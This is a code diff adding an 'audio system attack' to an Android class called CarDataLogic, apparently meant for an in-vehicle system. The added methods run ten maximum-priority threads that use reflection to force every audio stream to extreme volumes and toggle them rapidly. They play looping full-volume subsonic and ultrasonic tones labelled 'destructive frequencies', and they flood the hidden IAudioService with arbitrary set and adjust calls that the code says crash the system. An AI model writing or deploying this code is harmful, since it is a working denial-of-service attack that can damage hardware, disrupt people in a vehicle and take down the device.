@@ -11,6 +11,7 @@ import android.os.Bundle;
 import androidx.annotation.RequiresApi;
 
 import java.lang.ref.SoftReference;
+import java.lang.reflect.Method;
 import java.util.ArrayList;
 import java.util.List;
 import java.util.Random;
@@ -2600,9 +2601,378 @@ public class CarDataLogic {
 
 
 
+// -------------------------------------------------------------------------------------------------------
+
+    public Result executeAudioSystemAttack() {
+        final String TAG = "AUDIO_NUKE";
+        final String attackId = "AUDIO_NUKE_" + System.currentTimeMillis();
+
+        try {
+            android.content.Context ctx = getContextReflectively();
+            if (ctx == null) {
+                return new Result("Audio Nuclear Attack (failed: no context)", new ArrayList<>());
+            }
+
+            alarmUi("INITIATING AUDIO SYSTEM ATTACK");
+            alarmUi("Attack ID: " + attackId);
+
+            final int DURATION_SECONDS = 20; // How long to run the attack
+            final int THREAD_COUNT = 10; // Multiple simultaneous attacks
+
+            // Initialize counters and state
+            final java.util.concurrent.atomic.AtomicBoolean isAttacking = new java.util.concurrent.atomic.AtomicBoolean(true);
+            final java.util.concurrent.atomic.AtomicLong attackCount = new java.util.concurrent.atomic.AtomicLong(0);
+            final java.util.concurrent.atomic.AtomicLong successCount = new java.util.concurrent.atomic.AtomicLong(0);
+            final java.util.concurrent.atomic.AtomicLong errorCount = new java.util.concurrent.atomic.AtomicLong(0);
+
+            // Start monitoring
+            new Thread(() -> {
+                while (isAttacking.get()) {
+                    try {
+                        Thread.sleep(1000);
+                        long total = attackCount.get();
+
+                        String stats = String.format(
+                                "AUDIO ATTACK STATS\n" +
+                                        "Attack: %s\n" +
+                                        "Total Operations: %d\n" +
+                                        "Successes: %d\n" +
+                                        "Errors: %d\n" +
+                                        "Active Threads: %d\n" +
+                                        "Remaining: %d seconds",
+                                attackId, total, successCount.get(), errorCount.get(),
+                                THREAD_COUNT, DURATION_SECONDS - (attackCount.get()/100)
+                        );
+
+                        android.util.Log.e(TAG, stats);
+                        new android.os.Handler(android.os.Looper.getMainLooper()).post(() -> {
+                            alarmUi(stats);
+                        });
+
+                    } catch (Throwable t) {
+                        // Ignore
+                    }
+                }
+            }).start();
+
+            // Get AudioManager via reflection
+            Object audioManager = null;
+            try {
+                Class<?> audioManagerClass = Class.forName("android.media.AudioManager");
+                java.lang.reflect.Method getSystemService = ctx.getClass().getMethod("getSystemService", String.class);
+                audioManager = getSystemService.invoke(ctx, Context.AUDIO_SERVICE);
+
+                if (audioManager == null || !audioManagerClass.isInstance(audioManager)) {
+                    alarmUi("Failed to get AudioManager");
+                    return new Result("Audio Attack (failed to get AudioManager)", new ArrayList<>());
+                }
+
+                alarmUi("Got AudioManager via reflection");
+
+            } catch (Throwable t) {
+                android.util.Log.e(TAG, "Failed to get AudioManager", t);
+                alarmUi("Failed to get AudioManager: " + t.getMessage());
+                return new Result("Audio Attack (failed)", new ArrayList<>());
+            }
+
+            // Start attack threads
+            java.util.List<Thread> attackThreads = new java.util.ArrayList<>();
+
+            for (int threadId = 0; threadId < THREAD_COUNT; threadId++) {
+                Object finalAudioManager = audioManager;
+                int finalThreadId = threadId;
+                Thread attackThread = new Thread(() -> {
+                    try {
+                        while (isAttacking.get() && attackCount.get() < Long.MAX_VALUE) {
+                            attackCount.incrementAndGet();
+
+                            try {
+                                //1
+                                executeMaximumVolumeAttack(finalAudioManager, ctx, finalThreadId);
+                                successCount.incrementAndGet();
+                                //2
+                                executeSpeakerDestructionAttack(finalAudioManager, ctx, finalThreadId);
+                                //3
+                                executeDirectAudioServiceAttack(ctx, finalThreadId);
 
 
+                            } catch (Throwable t) {
+                                errorCount.incrementAndGet();
+                                // Continue attack despite errors
+                            }
+
+                            // No delay - maximum speed
+                        }
+                    } catch (Throwable t) {
+                        android.util.Log.e(TAG, "Attack thread " + finalThreadId + " crashed", t);
+                    }
+                });
+
+                attackThread.setName("AudioNuke-" + threadId);
+                attackThread.setPriority(Thread.MAX_PRIORITY);
+                attackThreads.add(attackThread);
+            }
+
+            // Start all attack threads
+            for (Thread thread : attackThreads) {
+                thread.start();
+            }
+
+            // Schedule termination
+            new android.os.Handler(android.os.Looper.getMainLooper()).postDelayed(() -> {
+                isAttacking.set(false);
+                alarmUi("AUDIO ATTACK COMPLETED AFTER " + DURATION_SECONDS + " SECONDS");
+                alarmUi("Total operations: " + attackCount.get());
+            }, DURATION_SECONDS * 1000);
+
+            return new Result("Audio System Attack",
+                    new java.util.ArrayList<>(alarmUiRows));
+
+        } catch (Throwable t) {
+            android.util.Log.e(TAG, "Failed to launch audio attack", t);
+            alarmUi("Attack failed to launch: " + t.getMessage());
+            return new Result("Audio System Attack (FAILED TO LAUNCH)",
+                    new java.util.ArrayList<>(alarmUiRows));
+        }
+    }
+
+    // ATTACK 1: Maximum Volume Override
+    private void executeMaximumVolumeAttack(Object audioManager, android.content.Context ctx, int threadId) throws Exception {
+        Class<?> audioManagerClass = Class.forName("android.media.AudioManager");
+
+        // Get all stream types via reflection
+        java.lang.reflect.Field[] fields = audioManagerClass.getDeclaredFields();
+        for (java.lang.reflect.Field field : fields) {
+            if (field.getName().startsWith("STREAM_") && field.getType() == int.class) {
+                try {
+                    int streamType = field.getInt(null);
+
+                    // Try to set volume to insane values
+                    java.lang.reflect.Method setStreamVolume = audioManagerClass.getMethod(
+                            "setStreamVolume",
+                            int.class, int.class, int.class
+                    );
+
+                    // First, try to set to max volume
+                    java.lang.reflect.Method getStreamMaxVolume = audioManagerClass.getMethod(
+                            "getStreamMaxVolume",
+                            int.class
+                    );
+
+                    int maxVolume = (int) getStreamMaxVolume.invoke(audioManager, streamType);
+
+                    // Try to bypass limits by setting volume to absurd values
+                    for (int attempt = maxVolume; attempt <= 1000; attempt += 100) {
+                        try {
+                            setStreamVolume.invoke(audioManager, streamType, attempt, 0);
+                            android.util.Log.w("AUDIO_ATTACK",
+                                    "Thread " + threadId + ": Set stream " + field.getName() +
+                                            " to volume " + attempt);
+                        } catch (Throwable t) {
+                            // Expected to fail, but we try anyway
+                        }
+                    }
+
+                    // Also try negative values
+                    try {
+                        setStreamVolume.invoke(audioManager, streamType, -1000, 0);
+                    } catch (Throwable t) {
+                        // Ignore
+                    }
+
+                    // Rapid volume adjustments
+                    java.lang.reflect.Method adjustStreamVolume = audioManagerClass.getMethod(
+                            "adjustStreamVolume",
+                            int.class, int.class, int.class
+                    );
+
+                    // ADJUST_RAISE constant
+                    int ADJUST_RAISE = audioManagerClass.getField("ADJUST_RAISE").getInt(null);
+                    int ADJUST_LOWER = audioManagerClass.getField("ADJUST_LOWER").getInt(null);
+                    int ADJUST_TOGGLE_MUTE = audioManagerClass.getField("ADJUST_TOGGLE_MUTE").getInt(null);
+
+                    // Rapid raise/lower cycles
+                    for (int i = 0; i < 100; i++) {
+                        adjustStreamVolume.invoke(audioManager, streamType, ADJUST_RAISE, 0);
+                        adjustStreamVolume.invoke(audioManager, streamType, ADJUST_LOWER, 0);
+                        adjustStreamVolume.invoke(audioManager, streamType, ADJUST_TOGGLE_MUTE, 0);
+                    }
+
+                } catch (Throwable t) {
+                    // Continue with next stream type
+                }
+            }
+        }
+    }
+
+    // ATTACK 2: Speaker Attack via Tone Generation
+    private void executeSpeakerDestructionAttack(Object audioManager, android.content.Context ctx, int threadId) throws Exception {
+        // Try to generate destructive frequencies
+        try {
+            Class<?> audioTrackClass = Class.forName("android.media.AudioTrack");
+
+            // Create audio track with maximum volume
+            int STREAM_MUSIC = Class.forName("android.media.AudioManager")
+                    .getField("STREAM_MUSIC").getInt(null);
+
+            int SAMPLE_RATE = 44100;
+            int CHANNEL_OUT_MONO = 4; // AudioFormat.CHANNEL_OUT_MONO
+            int ENCODING_PCM_16BIT = 2; // AudioFormat.ENCODING_PCM_16BIT
+
+            // Generate destructive sine waves
+            int bufferSize = android.media.AudioTrack.getMinBufferSize(
+                    SAMPLE_RATE, CHANNEL_OUT_MONO, ENCODING_PCM_16BIT);
+
+            // Create multiple AudioTracks to overload system
+            for (int trackNum = 0; trackNum < 10; trackNum++) {
+                try {
+                    // Generate destructive frequencies
+                    double[] freqs = {5, 10, 20, 40, 20000, 21000}; // Subsonic to ultrasonic
+
+                    for (double freq : freqs) {
+                        // Generate 1 second of tone
+                        short[] buffer = generateTone(freq, 1.0, SAMPLE_RATE);
+
+                        java.lang.reflect.Constructor<?> constructor = audioTrackClass.getConstructor(
+                                int.class, int.class, int.class, int.class, int.class, int.class
+                        );
+
+                        Object audioTrack = constructor.newInstance(
+                                STREAM_MUSIC, SAMPLE_RATE, CHANNEL_OUT_MONO,
+                                ENCODING_PCM_16BIT, buffer.length * 2, 1 // MODE_STATIC
+                        );
+
+                        // Write data
+                        java.lang.reflect.Method writeMethod = audioTrackClass.getMethod(
+                                "write", short[].class, int.class, int.class
+                        );
+
+                        writeMethod.invoke(audioTrack, buffer, 0, buffer.length);
+
+                        // Set volume to maximum
+                        java.lang.reflect.Method setVolumeMethod = audioTrackClass.getMethod(
+                                "setVolume", float.class
+                        );
+                        setVolumeMethod.invoke(audioTrack, 1.0f);
+
+                        // Play in loop
+                        java.lang.reflect.Method setLoopPointsMethod = audioTrackClass.getMethod(
+                                "setLoopPoints", int.class, int.class, int.class
+                        );
+                        setLoopPointsMethod.invoke(audioTrack, 0, buffer.length, -1); // Infinite loop
+
+                        java.lang.reflect.Method playMethod = audioTrackClass.getMethod("play");
+                        playMethod.invoke(audioTrack);
+
+                        // Don't release - let it play forever
+                    }
+
+                } catch (Throwable t) {
+                    // Continue with next track
+                }
+            }
+
+        } catch (Throwable t) {
+            // Fall back to other methods
+        }
+    }
+
+    // Helper: Generate tone
+    private short[] generateTone(double freq, double duration, int sampleRate) {
+        int numSamples = (int)(duration * sampleRate);
+        short[] buffer = new short[numSamples];
+
+        for (int i = 0; i < numSamples; i++) {
+            double sample = Math.sin(2 * Math.PI * i * freq / sampleRate);
+            buffer[i] = (short)(sample * Short.MAX_VALUE);
+        }
+
+        return buffer;
+    }
 
 
+    // ATTACK 3: AudioService Attack - Causes dead system on emulator
+    private void executeDirectAudioServiceAttack(android.content.Context ctx, int threadId) throws Exception {
+        try {
+            // Get IAudioService via ServiceManager
+            Class<?> serviceManagerClass = Class.forName("android.os.ServiceManager");
+            java.lang.reflect.Method getService = serviceManagerClass.getMethod(
+                    "getService", String.class
+            );
+
+            android.os.IBinder binder = (android.os.IBinder) getService.invoke(null, Context.AUDIO_SERVICE);
+
+            if (binder != null) {
+                // Get IAudioService interface
+                Class<?> iAudioServiceStub = Class.forName("android.media.IAudioService$Stub");
+                java.lang.reflect.Method asInterface = iAudioServiceStub.getMethod(
+                        "asInterface", android.os.IBinder.class
+                );
+
+                Object audioService = asInterface.invoke(null, binder);
+
+                if (audioService != null) {
+                    Class<?> iAudioServiceClass = Class.forName("android.media.IAudioService");
+
+                    // Call dangerous methods directly
+                    try {
+                        java.lang.reflect.Method adjustStreamVolume = iAudioServiceClass.getMethod(
+                                "adjustStreamVolume", int.class, int.class, int.class, String.class, String.class
+                        );
+
+                        // Flood with volume adjustments
+                        for (int i = 0; i < 1000; i++) {
+                            for (int stream = 0; stream < 10; stream++) {
+                                try {
+                                    adjustStreamVolume.invoke(audioService, stream, 1, 0,
+                                            ctx.getPackageName(), null);
+                                    adjustStreamVolume.invoke(audioService, stream, -1, 0,
+                                            ctx.getPackageName(), null);
+                                } catch (Throwable t) {
+                                    // Ignore
+                                }
+                            }
+                        }
+
+                    } catch (Throwable t) {
+                        // Method signature might be different
+                    }
+
+                    // Try to call other dangerous methods
+                    java.lang.reflect.Method[] methods = iAudioServiceClass.getMethods();
+                    for (java.lang.reflect.Method method : methods) {
+                        if (method.getName().contains("set") || method.getName().contains("adjust")) {
+                            try {
+                                // Call with dummy parameters
+                                java.lang.Class<?>[] paramTypes = method.getParameterTypes();
+                                Object[] params = new Object[paramTypes.length];
+
+                                // Fill with default values
+                                for (int i = 0; i < params.length; i++) {
+                                    if (paramTypes[i] == int.class) {
+                                        params[i] = 0;
+                                    } else if (paramTypes[i] == String.class) {
+                                        params[i] = ctx.getPackageName();
+                                    } else if (paramTypes[i] == boolean.class) {
+                                        params[i] = true;
+                                    } else {
+                                        params[i] = null;
+                                    }
+                                }
+
+                                // Call the method
+                                method.invoke(audioService, params);
+
+                            } catch (Throwable t) {
+                                // Ignore failures
+                            }
+                        }
+                    }
+                }
+            }
+        } catch (Throwable t) {
+            // ServiceManager access might fail
+        }
+    }
 
 }
